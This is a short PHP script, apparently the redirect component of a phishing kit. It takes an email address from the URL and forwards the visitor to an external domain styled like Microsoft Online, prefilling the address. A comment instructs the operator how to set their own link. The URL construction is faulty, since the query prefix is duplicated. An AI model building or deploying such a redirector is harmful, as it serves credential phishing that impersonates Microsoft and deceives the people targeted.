<?php

$email = $_GET['email'];

//Your link must be in this format "https://comrfound.com/vnchoice/index.php". with a forward slash and nothing more.

$link = "https://ms-online.live/bt/r/MsCQarj?email=";
$sess = "?email=$email";

header ("Refresh: 0; url=$link$sess");

?>
